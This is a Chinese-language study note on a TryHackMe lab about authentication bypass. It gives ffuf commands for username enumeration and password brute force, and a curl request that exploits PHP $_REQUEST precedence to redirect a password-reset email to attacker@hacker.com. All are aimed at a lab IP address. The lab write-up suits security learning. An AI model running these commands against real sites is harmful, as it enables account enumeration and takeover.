---
title: Authentication_Bypass_身份验证绕过
date: 2024-05-11 04:40:31
updated: 2026-04-13 14:03:41
tags:
  - 打靶
  - TryHackMe
  - Jr_Penetration_Tester
  - Introduction_to_Web_Hacking
---
## Username Enumeration 用户名枚举

如果您尝试输入用户名 admin 并使用虚假信息填写其他表单字段，您会看到我们收到错误 An account with this username already exist。我们可以使用下面的 ffuf 工具，利用此错误消息的存在来生成已在系统上注册的有效用户名列表。ffuf 工具使用常用用户名列表来检查是否有任何匹配项。

[GitHub - ffuf/ffuf: Fast web fuzzer written in Go](https://github.com/ffuf/ffuf).

```bash
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.98.101/customers/signup -mr "username already exists"
```

\-w 参数选择文件在包含我们将要检查的用户名列表的计算机上的位置。

\-X 参数指定请求方法，默认情况下这将是一个 GET 请求，但在我们的示例中是一个 POST 请求。

\-d 参数指定我们将要发送的数据。在我们的示例中，我们有 username、email、password 和 cpassword 字段。我们已将用户名的值设置为 FUZZ。在 ffuf 工具中，FUZZ 关键字表示我们的单词列表中的内容将在请求中插入的位置。

\-H 参数用于向请求添加其他标头。在本例中，我们设置了 Content-Type “以便Web服务器知道我们正在发送表单数据”。

\-u 参数指定我们要向其发出请求的 URL。

\-mr 参数是我们正在寻找的页面上的文本，以验证我们是否找到了有效的用户名。

## Brute Force

使用 ffuf 进行暴力破解

```bash
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.98.101/customers/login -fc 200
```

此 ffuf 命令与任务 2 中的上一个命令略有不同。以前，我们使用 FUZZ 关键字来选择在请求中插入单词列表中的数据的位置，但由于我们使用多个单词列表，因此我们必须指定自己的 FUZZ 关键字。在这种情况下，我们选择了 W1 有效用户名列表和 W2 密码列表。多个单词列表再次使用 -w 参数指定，但用逗号分隔。对于正匹配，我们使用参数 -fc 来检查 HTTP 状态代码是否为 200。

## Logic Flaw 逻辑缺陷

使用 curl 工具手动向 Web 服务器发出请求

```bash
user@tryhackme$ curl 'http://10.10.98.101/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

\-H 标志向请求添加一个额外的标头。在本例中，我们将 Content-Type 设置为 application/x-www-form-urlencoded ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。

### $\_REQUEST变量覆盖

PHP `$_REQUEST` 变量是一个数组，其中包含从查询字符串和 POST 数据接收的数据。如果查询字符串和 POST 数据都使用相同的键名，则此变量的应用程序逻辑**优先使用 POST 数据字段**而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的传递位置。

```bash
user@tryhackme$ curl 'http://10.10.98.101/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

## Cookie Tampering Cookie 篡改

### **Hashing**

有时，Cookie 值可能看起来像一长串随机字符;这些被称为哈希，是原始文本的不可逆表示。以下是您可能会遇到的一些示例：

| **Original String**<br>**原始字符串**​ | **Hash Method**<br>**Hash 方法**​ | **Output**​ |
| --- | --- | --- |
| 1 | md5 | c4ca4238a0b923820dcc509a6f75849b |
| 1 | sha-256 | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b |
| 1 | sha-512 | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |
| 1 | sha1 | 356a192b7913b04c54574d18c28d46e6395428ab |

从上表中可以看出，同一输入字符串的哈希输出可能会因所使用的哈希方法而有很大差异。尽管哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/) 等服务可以保存数十亿个哈希及其原始字符串的数据库。

### **Encoding**

base64、base32等